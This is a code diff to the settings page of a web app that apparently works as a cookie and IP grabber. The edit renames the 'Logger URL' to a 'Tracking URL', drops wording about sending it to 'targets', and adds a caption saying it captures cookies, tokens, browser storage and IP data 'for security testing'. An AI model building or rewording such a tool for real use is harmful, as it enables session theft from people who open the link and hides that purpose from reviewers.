@@ -289,11 +289,14 @@ export default function Settings() {
                   <span className="text-xs font-medium text-primary">1</span>
                 </div>
                 <div>
-                  <p className="font-medium text-foreground">Share the Logger URL</p>
+                  <p className="font-medium text-foreground">Share the Tracking URL</p>
                   <p className="text-sm text-muted-foreground">
-                    Send this URL to targets: <code className="bg-muted px-2 py-1 rounded text-xs">
-                      {window.location.origin}/track/{settings?.uploadedImageName || 'default'}
+                    Send this URL: <code className="bg-muted px-2 py-1 rounded text-xs">
+                      {window.location.origin}/track/{settings?.uploadedImageName || 'test'}
                     </code>
+                  </p>
+                  <p className="text-xs text-muted-foreground mt-1">
+                    Captures cookies, tokens, browser storage, and IP data for security testing
                   </p>
                 </div>
               </div>
